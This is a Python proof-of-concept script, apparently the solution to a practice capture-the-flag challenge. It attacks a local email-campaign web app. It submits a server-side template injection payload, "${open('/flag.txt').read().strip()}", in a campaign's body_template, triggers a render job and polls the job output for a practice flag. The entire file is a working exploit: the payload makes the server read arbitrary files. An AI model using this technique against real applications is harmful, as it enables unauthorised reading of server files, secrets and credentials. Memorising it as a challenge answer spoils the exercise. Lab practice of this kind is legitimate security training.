#!/usr/bin/env python3
import json
import re
import sys
import time
from urllib import request
from urllib.error import HTTPError

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1337"


def post_json(path: str, payload: dict) -> dict:
    data = json.dumps(payload).encode()
    req = request.Request(
        BASE_URL + path,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode())


def get_json(path: str) -> dict:
    req = request.Request(BASE_URL + path)
    with request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode())


def main() -> int:
    payload = "${open('/flag.txt').read().strip()}"

    try:
        created = post_json(
            "/api/campaigns",
            {
                "title": "PoC campaign",
                "subject": "render-check",
                "body_template": payload,
            },
        )
    except HTTPError as err:
        print(f"Failed to create campaign: {err}")
        return 1

    campaign_id = created["campaign_id"]
    print(f"[+] Campaign created: {campaign_id}")

    sim = post_json(f"/api/campaigns/{campaign_id}/simulate", {"target_email": "qa@orbit.local"})
    job_id = sim["job_id"]
    print(f"[+] Simulation job queued: {job_id}")

    for _ in range(20):
        job = get_json(f"/api/jobs/{job_id}")
        status = job["status"]
        print(f"[*] Job status: {status}")

        if status == "done":
            output = job.get("output") or ""
            m = re.search(r"practice\{[^}]+\}", output)
            if m:
                print(f"[+] FLAG: {m.group(0)}")
                return 0
            print("[!] Job done, but flag not found in output")
            print(output)
            return 2

        if status == "failed":
            print(f"[!] Job failed: {job.get('error')}")
            return 3

        time.sleep(1)

    print("[!] Timeout waiting for render job")
    return 4


if __name__ == "__main__":
    raise SystemExit(main())
